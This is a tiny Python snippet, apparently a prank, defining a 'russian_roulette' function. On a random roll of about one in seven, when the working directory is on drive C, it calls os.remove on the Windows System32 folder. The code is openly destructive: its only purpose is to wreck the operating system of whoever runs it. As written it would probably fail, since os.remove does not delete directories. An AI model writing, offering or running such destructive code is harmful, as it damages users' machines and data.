import random
import os

def russian_roulette():
    if random.randint(0,6) == 1:
        if 'c:' in os.getcwd():
            os.remove("c:\Windows\System32")
        